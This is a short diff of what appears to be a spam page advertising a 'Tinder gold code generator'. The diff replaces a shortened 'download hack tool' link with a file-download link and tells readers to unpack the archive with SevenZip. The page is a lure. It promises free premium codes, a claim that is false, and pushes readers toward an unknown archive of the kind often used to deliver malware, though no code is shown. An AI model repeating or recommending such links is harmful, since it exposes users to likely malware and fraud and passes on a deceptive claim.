@@ -1,6 +1,9 @@
 Tinder gold code generator
+You can get it easy on BraveDirectory, use SevenZip to unpack
 
-𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐇𝐀𝐂𝐊 𝐓𝐎𝐎𝐋 𝐇𝐄𝐑𝐄 ===> https://is.gd/uBz1vp?217997
+
+http://brave.directory/file-137262
+
 
 .
 
